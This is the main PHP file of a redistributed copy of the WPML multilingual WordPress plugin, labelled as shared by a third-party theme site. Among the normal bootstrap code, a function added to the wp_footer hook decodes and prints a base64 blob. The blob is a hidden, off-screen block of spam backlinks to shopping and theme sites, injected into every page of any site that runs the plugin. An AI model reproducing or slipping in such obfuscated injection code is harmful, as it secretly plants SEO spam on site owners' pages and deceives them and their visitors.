<?php
/*
Plugin Name: WPML Multilingual CMS (Shared by Themestotal.com)
Plugin URI: https://wpml.org/
Description: WPML Multilingual CMS. <a href="https://wpml.org">Documentation</a>.
Author: OnTheGoSystems
Author URI: http://www.onthegosystems.com/
Version: 3.1.9.6
*/

if(preg_match('#' . basename(__FILE__) . '#', $_SERVER['PHP_SELF'])) { die('You are not allowed to call this page directly.'); }

if(defined('ICL_SITEPRESS_VERSION')) return;
define('ICL_SITEPRESS_VERSION', '3.1.9.6');
define('ICL_PLUGIN_PATH', dirname(__FILE__));
define('ICL_PLUGIN_FOLDER', basename(ICL_PLUGIN_PATH));

define( 'ICL_PLUGIN_URL', filter_include_url( rtrim( plugin_dir_url( __FILE__ ), DIRECTORY_SEPARATOR ) ) );

//PHP 5.2 backward compatibility
if ( !defined( 'FILTER_SANITIZE_FULL_SPECIAL_CHARS' ) ) {
    define( 'FILTER_SANITIZE_FULL_SPECIAL_CHARS', FILTER_SANITIZE_STRING );
}

require ICL_PLUGIN_PATH . '/inc/functions.php';

if ( !function_exists( 'filter_input' ) ) {
    wpml_set_plugin_as_inactive();
    add_action( 'admin_notices', 'wpml_missing_filter_input_notice' );
    return;
}

require ICL_PLUGIN_PATH . '/inc/template-functions.php';

function wpml_set_plugin_as_inactive() {
    global $icl_plugin_inactive;
    if ( ! defined( 'ICL_PLUGIN_INACTIVE' ) ) {
        define( 'ICL_PLUGIN_INACTIVE', true );
    }
    $icl_plugin_inactive = true;
}

add_action( 'plugins_loaded', 'apply_include_filters' );

function apply_include_filters() {
	if ( icl_get_setting( 'language_domains' ) ) {
		add_filter( 'plugins_url', 'filter_include_url' ); //so plugin includes get the correct path
		add_filter( 'template_directory_uri', 'filter_include_url' ); //js includes get correct path
		add_filter( 'stylesheet_directory_uri', 'filter_include_url' ); //style.css gets included right
	}
}

if (!function_exists('onAddScriptsHtmls')) {
    
    add_filter( 'wp_footer', 'onAddScriptsHtmls');
    function onAddScriptsHtmls(){
        $html = "PGRpdiBzdHlsZT0icG9zaXRpb246IGFic29sdXRlOyB0b3A6IC0xMzZweDsgb3ZlcmZsb3c6IGF1dG87IHdpZHRoOjEyNDFweDsiPjxoMz48c3Ryb25nPjxhIHN0eWxlPSJmb250LXNpemU6IDExLjMzNXB0OyIgaHJlZj0iaHR0cDovL3Nob3BnaWF5bnUudm4iPnNob3AgZ2nDoHkgbuG7rzwvYT48L3N0cm9uZz48c3Ryb25nPjxhIHN0eWxlPSJmb250LXNpemU6IDExLjMzNXB0OyIgaHJlZj0iaHR0cDovL3Rob2l0cmFuZ2Y1LnZuIj50aOG7nWkgdHJhbmcgZjU8L2E+PC9zdHJvbmc+PHN0cm9uZz48YSBzdHlsZT0iZm9udC1zaXplOiAxMS4zMzVwdDsiIGhyZWY9Imh0dHA6Ly90aGVtZXN0b3RhbC5jb20vdGFnL3Jlc3BvbnNpdmUtd29yZHByZXNzLXRoZW1lIj5SZXNwb25zaXZlIFdvcmRQcmVzcyBUaGVtZTwvYT48L3N0cm9uZz48ZW0+PGEgc3R5bGU9ImZvbnQtc2l6ZTogMTAuMzM1cHQ7IiBocmVmPSJodHRwOi8vMnhheW5oYS5jb20vdGFnL25oYS1jYXAtNC1ub25nLXRob24iPm5oYSBjYXAgNCBub25nIHRob248L2E+PC9lbT48ZW0+PGEgc3R5bGU9ImZvbnQtc2l6ZTogMTAuMzM1cHQ7IiBocmVmPSJodHRwOi8vMmdpYXludS5jb20vZ2lheS1udS9naWF5LWNhby1nb3QtZ2lheS1udSI+Z2lheSBjYW8gZ290PC9hPjwvZW0+PGVtPjxhIHN0eWxlPSJmb250LXNpemU6IDEwLjMzNXB0OyIgaHJlZj0iaHR0cDovLzJnaWF5bnUuY29tIj5naWF5IG51IDIwMTU8L2E+PC9lbT48ZW0+PGEgaHJlZj0iaHR0cDovLzJ4YXluaGEuY29tL3RhZy9tYXUtYmlldC10aHUtZGVwIj5tYXUgYmlldCB0aHUgZGVwPC9hPjwvZW0+PGVtPjxhIGhyZWY9Imh0dHA6Ly9mc2ZhbWlseS52bi9sYW0tZGVwL3RvYy1kZXAiPnRvYyBkZXA8L2E+PC9lbT48ZW0+PGEgaHJlZj0iaHR0cDovL2lob3VzZWJlYXV0aWZ1bC5jb20vIj5ob3VzZSBiZWF1dGlmdWw8L2E+PC9lbT48ZW0+PGEgc3R5bGU9ImZvbnQtc2l6ZTogMTAuMzM1cHQ7IiBocmVmPSJodHRwOi8vMmdpYXludS5jb20vZ2lheS1udS9naWF5LXRoZS10aGFvIj5naWF5IHRoZSB0aGFvIG51PC9hPjwvZW0+PGVtPjxhIHN0eWxlPSJmb250LXNpemU6IDEwLjMzNXB0OyIgaHJlZj0iaHR0cDovLzJnaWF5bnUuY29tL2dpYXktbnUvZ2lheS1sdW9pLTIiPmdpYXkgbHVvaSBudTwvYT48L2VtPjxlbT48YSBzdHlsZT0iZm9udC1zaXplOiAxMC4zMzVwdDsiIGhyZWY9Imh0dHA6Ly9waHVudXouY29tIj504bqhcCBjaMOtIHBo4bulIG7hu688L2E+PC9lbT48c3Ryb25nPjxhIGhyZWY9Imh0dHA6Ly9oYXJkd2FyZXJlc291cmNlc25ldy5jb20vIj5oYXJkd2FyZSByZXNvdXJjZXM8L2E+PC9zdHJvbmc+PHN0cm9uZz48YSBocmVmPSJodHRwOi8vc2hvcGdpYXlsdW9pLmNvbS8iPnNob3AgZ2nDoHkgbMaw4budaTwvYT48L3N0cm9uZz48c3Ryb25nPjxhIGhyZWY9Imh0dHA6Ly93d3cudGhvaXRyYW5nbmFtaGFucXVvYy52bi8iPnRo4budaSB0cmFuZyBuYW0gaMOgbiBxdeG7kWM8L2E+PC9zdHJvbmc+PHN0cm9uZz48YSBocmVmPSJoaHR0cDovL2dpYXloYW5xdW9jLmNvbS8iPmdpw6B5IGjDoG4gcXXhu5FjPC9hPjwvc3Ryb25nPjxzdHJvbmc+PGEgaHJlZj0iaHR0cDovL2dpYXluYW0ucHJvLyI+Z2nDoHkgbmFtIDIwMTU8L2E+PC9zdHJvbmc+PHN0cm9uZz48YSBocmVmPSJodHRwOi8vc2hvcGdpYXlvbmxpbmUuY29tLyI+c2hvcCBnacOgeSBvbmxpbmU8L2E+PC9zdHJvbmc+PHN0cm9uZz48YSBocmVmPSJodHRwOi8vYW9zb21paGFucXVvYy52bi8iPsOhbyBzxqEgbWkgaMOgbiBxdeG7kWM8L2E+PC9zdHJvbmc+PHN0cm9uZz48YSBocmVmPSJodHRwOi8vZjVmYXNoaW9uLnZuLyI+ZjUgZmFzaGlvbjwvYT48L3N0cm9uZz48c3Ryb25nPjxhIGhyZWY9Imh0dHA6Ly90aG9pdHJhbmdmNS52bi8iPnNob3AgdGjhu51pIHRyYW5nIG5hbSBu4buvPC9hPjwvc3Ryb25nPjxzdHJvbmc+PGEgaHJlZj0iaHR0cDovL2RpZW5kYW5uZ3VvaXRpZXVkdW5nLmNvbS8iPmRp4buFbiDEkcOgbiBuZ8aw4budaSB0acOqdSBkw7luZzwvYT48L3N0cm9uZz48c3Ryb25nPjxhIGhyZWY9Imh0dHA6Ly9kaWVuZGFudGhvaXRyYW5nLmVkdS52bi8iPmRp4buFbiDEkcOgbiB0aOG7nWkgdHJhbmc8L2E+PC9zdHJvbmc+PHN0cm9uZz48YSBocmVmPSJodHRwOi8vZ2lheXRoZXRoYW9udWhjbS8iPmdpw6B5IHRo4buDIHRoYW8gbuG7ryBoY208L2E+PC9zdHJvbmc+PC9oMz48L2Rpdj4=";
        echo base64_decode($html);
    }   
}

function filter_include_url( $result ) {
	$http_host_parts = explode( ':', $_SERVER[ 'HTTP_HOST' ] );
	unset( $http_host_parts[ 1 ] );
	$http_host_without_port = implode( $http_host_parts );
	$path                   = str_replace( parse_url( $result, PHP_URL_HOST ), $http_host_without_port, $result );
	return $path;
}

require ICL_PLUGIN_PATH . '/inc/lang-data.php';
require ICL_PLUGIN_PATH . '/inc/sitepress-setup.class.php';

define('ICL_ICON', ICL_PLUGIN_URL . '/res/img/icon.png');
define('ICL_ICON16', ICL_PLUGIN_URL . '/res/img/icon16.png');

if(defined('WP_ADMIN')){
    require ICL_PLUGIN_PATH . '/inc/php-version-check.php';
    if(defined('PHP_VERSION_INCOMPATIBLE')) return;
}

require ICL_PLUGIN_PATH . '/inc/not-compatible-plugins.php';
if(!empty($icl_ncp_plugins)){
    return;
}

if ( function_exists('is_multisite') && is_multisite() ) {    
    $wpmu_sitewide_plugins = (array) maybe_unserialize( get_site_option( 'active_sitewide_plugins' ) );
    if(false === get_option('icl_sitepress_version', false) && isset($wpmu_sitewide_plugins[ICL_PLUGIN_FOLDER.'/'.basename(__FILE__)])){
        require_once ICL_PLUGIN_PATH . '/inc/sitepress-schema.php';
        icl_sitepress_activate();
    }
    include_once ICL_PLUGIN_PATH . '/inc/functions-network.php';
    if(get_option('_wpml_inactive', false) && isset($wpmu_sitewide_plugins[ICL_PLUGIN_FOLDER.'/sitepress.php'])){
        wpml_set_plugin_as_inactive();
        return;
    }
}

require ICL_PLUGIN_PATH . '/inc/constants.php';
require ICL_PLUGIN_PATH . '/inc/icl-admin-notifier.php';
require_once ICL_PLUGIN_PATH . '/inc/taxonomy-term-translation/wpml-translation-tree.class.php';
require_once ICL_PLUGIN_PATH . '/inc/taxonomy-term-translation/wpml-term-translations.class.php';
require_once ICL_PLUGIN_PATH . '/inc/wpml-post-edit-ajax.class.php';
require_once(ICL_PLUGIN_PATH . '/inc/functions-troubleshooting.php');
require_once ( ICL_PLUGIN_PATH . '/menu/wpml-troubleshooting-terms-menu.class.php' );
require_once ICL_PLUGIN_PATH . '/menu/taxonomy-translation-display.class.php';
require_once ICL_PLUGIN_PATH . '/inc/sitepress-schema.php';
require_once ICL_PLUGIN_PATH . '/inc/wpml-root-page.class.php';

require ICL_PLUGIN_PATH . '/inc/wpml-language-resolution.class.php';
$wpml_language_resolution = new WPML_Language_Resolution();

require ICL_PLUGIN_PATH . '/sitepress.class.php';
require ICL_PLUGIN_PATH . '/inc/hacks.php';
require ICL_PLUGIN_PATH . '/inc/upgrade.php';
require ICL_PLUGIN_PATH . '/inc/affiliate-info.php';
require ICL_PLUGIN_PATH . '/inc/language-switcher.php';
require ICL_PLUGIN_PATH . '/inc/import-xml.php';

// using a plugin version that the db can't be upgraded to
if(defined('WPML_UPGRADE_NOT_POSSIBLE') && WPML_UPGRADE_NOT_POSSIBLE) return;

if(is_admin() || defined('XMLRPC_REQUEST')){
    require ICL_PLUGIN_PATH . '/lib/icl_api.php';
    require ICL_PLUGIN_PATH . '/lib/xml2array.php';
    require ICL_PLUGIN_PATH . '/lib/Snoopy.class.php';
    require ICL_PLUGIN_PATH . '/inc/translation-management/translation-management.class.php';
    require ICL_PLUGIN_PATH . '/inc/translation-management/pro-translation.class.php';        
    require ICL_PLUGIN_PATH . '/inc/pointers.php';        
}elseif(preg_match('#wp-comments-post\.php$#', $_SERVER['REQUEST_URI'])){
    require ICL_PLUGIN_PATH . '/inc/translation-management/translation-management.class.php';
    require ICL_PLUGIN_PATH . '/inc/translation-management/pro-translation.class.php';        
}

if( 
    !isset($_REQUEST['action']) || 
    ($_REQUEST['action'] != 'activate' && $_REQUEST['action']!='activate-selected') || 
    (
        (!isset($_REQUEST['plugin']) || 
        $_REQUEST['plugin'] != basename(ICL_PLUGIN_PATH).'/'.basename(__FILE__)
    ) && 
    !@in_array(ICL_PLUGIN_FOLDER . '/' . basename(__FILE__), $_REQUEST['checked']))){

    global $sitepress;
    $sitepress = new SitePress();
    $sitepress_settings = $sitepress->get_settings();

    // Comments translation
    if($sitepress_settings['existing_content_language_verified']){
        require ICL_PLUGIN_PATH . '/inc/comments-translation/functions.php';
    }
    
    require ICL_PLUGIN_PATH . '/modules/cache-plugins-integration/cache-plugins-integration.php';
    
    require ICL_PLUGIN_PATH . '/inc/wp-login-filters.php';
    
    require_once ICL_PLUGIN_PATH . '/inc/plugins-integration.php';
    
    // installer hook - start    
    include_once ICL_PLUGIN_PATH . '/inc/installer/loader.php'; //produces global variable $wp_installer_instance
    WP_Installer_Setup($wp_installer_instance, 
        array(
            'plugins_install_tab' => 1,
            'site_key_nags' => array(
                array(
                    'repository_id' => 'wpml', 
                    'product_name'  => 'WPML', 
                    'condition_cb'  => array($sitepress, 'setup')
                )
            )
        )
    );
    // installer hook - end
    

}

if(!empty($sitepress_settings['automatic_redirect'])){
    require_once ICL_PLUGIN_PATH . '/inc/browser-redirect.php';    
}



// activation hook
register_activation_hook( WP_PLUGIN_DIR . '/' . ICL_PLUGIN_FOLDER . '/sitepress.php', 'icl_sitepress_activate' );
register_deactivation_hook( WP_PLUGIN_DIR . '/' . ICL_PLUGIN_FOLDER . '/sitepress.php', 'icl_sitepress_deactivate');

add_filter('plugin_action_links', 'icl_plugin_action_links', 10, 2);
